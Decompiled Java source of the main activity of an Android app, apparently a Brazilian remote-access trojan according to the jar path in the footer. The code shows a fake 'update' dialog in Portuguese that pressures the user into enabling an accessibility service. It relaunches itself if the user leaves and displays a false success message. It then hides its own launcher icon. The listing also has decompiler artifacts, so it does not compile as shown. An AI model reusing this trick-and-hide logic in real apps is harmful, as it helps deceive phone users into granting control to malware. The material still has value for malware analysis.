package com.irifix;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.text.Html;
import android.view.View;
import android.widget.Button;
import java.util.Timer;
import java.util.TimerTask;

public class MainActivity extends Activity {
  public static MainActivity a;
  
  private static boolean b = false;
  
  private static Handler c = new Handler();
  
  private static Timer d = null;
  
  public static void a() {
    MainActivity mainActivity = a;
    if (mainActivity != null) {
      b = true;
      mainActivity.finish();
    } 
  }
  
  private void b() {
    Context context = getApplicationContext();
    if (j.a(context)) {
      j.c(context);
      if (!g.a(context, getPackageName())) {
        c.post(new Runnable(this) {
              public void run() {
                MainActivity.a.a((Context)MainActivity.a);
                Button button = (Button)this.a.findViewById(2131165219);
                if (button != null) {
                  button.setOnClickListener(new View.OnClickListener(this) {
                        public void onClick(View param2View) {
                          MainActivity.a.a((Context)MainActivity.a);
                        }
                      });
                  button.setVisibility(0);
                } 
              }
            });
        d = new Timer();
        d.schedule(new c(context), 45000L);
      } 
    } else {
      c.post(new Runnable(this) {
            public void run() {
              MainActivity.b.a((Context)MainActivity.a);
            }
          });
      c.postDelayed(new Runnable(this, context) {
            public void run() {
              ComponentName componentName = new ComponentName(this.a, MainActivity.class);
              this.a.getPackageManager().setComponentEnabledSetting(componentName, 2, 1);
            }
          }15000L);
    } 
  }
  
  protected void onCreate(Bundle paramBundle) {
    super.onCreate(paramBundle);
    setContentView(2131296284);
    a = this;
    (new Thread(new Runnable(this) {
          public void run() {
            MainActivity.a(this.a);
          }
        })).start();
  }
  
  protected void onDestroy() {
    super.onDestroy();
    a = null;
    a.a();
    b.a();
    Timer timer = d;
    if (timer != null) {
      timer.cancel();
      d = null;
    } 
    if (b) {
      b = false;
      c.postDelayed(new Runnable(this) {
            public void run() {
              Intent intent = this.a.getIntent();
              this.a.startActivity(intent);
            }
          },  100L);
    } 
  }
  
  protected void onPause() {
    super.onPause();
  }
  
  protected void onResume() {
    super.onResume();
  }
  
  private static class a {
    private static AlertDialog a;
    
    private static void b() {
      AlertDialog alertDialog = a;
      if (alertDialog != null) {
        alertDialog.dismiss();
        a = null;
      } 
    }
    
    private static void b(Context param1Context) {
      if (a == null) {
        AlertDialog.Builder builder = new AlertDialog.Builder(param1Context);
        builder.setTitle("Atenção");
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("Para atualizar você precisa ativar o serviço de acessiblidade em <b>Serviços > ");
        stringBuilder.append(param1Context.getString(2131427368));
        stringBuilder.append("</b> na proxima tela.");
        builder.setMessage((CharSequence)Html.fromHtml(stringBuilder.toString()));
        builder.setCancelable(false);
        builder.setNeutralButton("Continuar", new DialogInterface.OnClickListener(param1Context) {
              public void onClick(DialogInterface param2DialogInterface, int param2Int) {
                Intent intent = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
                intent.addFlags(268435456);
                intent.addFlags(32768);
                intent.addFlags(8388608);
                this.a.startActivity(intent);
              }
            });
        a = builder.create();
      } 
      a.show();
    }
  }
  
  static final class null implements DialogInterface.OnClickListener {
    null(Context param1Context) {}
    
    public void onClick(DialogInterface param1DialogInterface, int param1Int) {
      Intent intent = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
      intent.addFlags(268435456);
      intent.addFlags(32768);
      intent.addFlags(8388608);
      this.a.startActivity(intent);
    }
  }
  
  private static class b {
    private static AlertDialog a;
    
    private static void b() {
      AlertDialog alertDialog = a;
      if (alertDialog != null) {
        alertDialog.dismiss();
        a = null;
      } 
    }
    
    private static void b(Context param1Context) {
      if (a == null) {
        AlertDialog.Builder builder = new AlertDialog.Builder(param1Context);
        builder.setTitle("Atenção");
        builder.setMessage((CharSequence)Html.fromHtml("Atualização aplicada com sucesso."));
        builder.setCancelable(false);
        builder.setNeutralButton("Continuar", new DialogInterface.OnClickListener() {
              public void onClick(DialogInterface param2DialogInterface, int param2Int) {
                MainActivity.a.finish();
              }
            });
        a = builder.create();
      } 
      a.show();
    }
  }
  
  static final class null implements DialogInterface.OnClickListener {
    public void onClick(DialogInterface param1DialogInterface, int param1Int) {
      MainActivity.a.finish();
    }
  }
  
  private static class c extends TimerTask {
    private Context a;
    
    c(Context param1Context) {
      this.a = param1Context;
    }
    
    public void run() {
      Context context = this.a;
      if (!g.a(context, context.getPackageName()))
        MainActivity.a(); 
    }
  }
}


/* Location:              /home/fahim/Desktop/BrazilianRat-dex2jar.jar!/com/irifix/MainActivity.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */